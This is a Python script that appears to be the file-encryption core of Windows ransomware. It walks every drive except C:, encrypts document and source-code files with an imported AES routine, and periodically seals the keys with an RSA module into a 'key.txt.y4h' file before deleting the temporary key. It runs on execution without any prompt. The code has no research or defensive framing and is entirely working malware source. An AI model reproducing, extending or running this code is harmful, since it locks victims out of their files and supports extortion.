import base64
import os
import win32api
from aes import aes_encrypt
import RSA as Rencrypt
def encrypt_windows():
    count=1
    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
        if(str(drive) == "C:\\"):
                continue
        for root,dirs,files in os.walk(drive):
            for f in files:
                try:
                    ext = f.split(".")[1]
                except:
                    continue
                if(ext == "docx" or ext == "txt" or ext == "pptx" or ext == "pdf" or ext == "json" or ext == "html" or ext == "css" or ext == "js" or ext == "c" or ext == "java" or ext=="py"):
                    try:
                        path = str(os.path.join(root, f))
                        if("\\\\res\\\\" in path and ("temp_key" in path or "key" in path)):
                            continue
                        aes_encrypt(path)
                        if(count % 3==0):
                            Rencrypt.d_main()
                            f = open('res/key.txt.y4h','ab').write(open('res/temp_key.txt.y4h','rb').read())
                            os.remove('res/temp_key.txt.y4h')
                            count = 1
                        count +=1     
                    except Exception as e:
                        continue
    try:
        data = open('res/temp_key.txt','r')
        data.close()
        Rencrypt.d_main()
        f = open('res/key.txt.y4h','ab').write(open('res/temp_key.txt.y4h','rb').read())
        os.remove('res/temp_key.txt.y4h')
    except:
        pass


encrypt_windows()
